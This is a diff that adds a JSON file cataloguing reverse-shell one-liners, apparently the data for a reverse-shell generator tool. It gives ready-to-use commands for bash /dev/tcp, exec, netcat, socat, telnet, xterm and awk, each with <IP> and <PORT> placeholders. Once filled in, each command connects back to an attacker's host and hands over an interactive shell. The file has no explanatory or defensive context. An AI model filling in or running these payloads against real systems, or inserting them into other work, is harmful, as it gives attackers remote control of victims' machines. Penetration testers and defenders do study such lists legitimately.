@@ -1,0 +1,53 @@
+{
+    "bash": [
+        {
+            "reverse": "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
+        },
+        {
+            "reverse": "exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0"
+        }
+    ],
+    "exec": [
+        {
+            "reverse": "exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done"
+        },
+        {
+            "reverse": "0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196"
+        }
+    ],
+    "netcat": [
+        {
+            "reverse": "nc -e /bin/sh <IP> <PORT>"
+        },
+        {
+            "reverse": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f"
+        }
+    ],
+    "xterm": [
+        {
+            "name": "xterm",
+            "reverse": "xterm -display <IP>:1"
+        }
+    ],
+    "socat": [
+        {
+            "reverse": "socat tcp-connect:<IP>:<PORT> exec:\"bash -li\",pty,stderr,setsid,sigint,sane"
+        }
+    ],
+    "telnet": [
+        {
+            "reverse": "telnet <IP> 65000 | /bin/bash | telnet <IP> <PORT>"
+        },
+        {
+            "reverse": "rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet <IP> <PORT> > f"
+        },
+        {
+            "reverse": "rm -f x; mknod x p && telnet <IP> <PORT> 0<x | /bin/bash 1>x"
+        }
+    ],
+    "awk": [
+        {
+            "reverse": "awk 'BEGIN {s = \"/inet/tcp/0/<IP>/<PORT>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+        }
+    ]
+}
